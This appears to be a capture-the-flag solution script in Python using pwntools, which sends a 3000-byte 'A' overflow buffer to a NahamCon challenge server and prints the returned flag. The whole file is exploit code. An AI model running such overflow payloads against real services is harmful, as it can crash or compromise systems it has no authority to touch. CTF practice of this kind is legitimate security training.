#!/usr/bin/env python

from pwn import *

host,port = 'challenge.nahamcon.com', 30810

offset = 3000
overflow = "A" * offset

buffer = bytes(overflow,"latin-1")

try:
  s = remote(host, port)
  s.recv()
  print("Sending evil buffer...")
  s.sendline(buffer)
  flag = s.recv().decode('utf-8')
  print("Flag: " + flag)
  print("Done!")
except:
  print("Could not connect.")

s.close
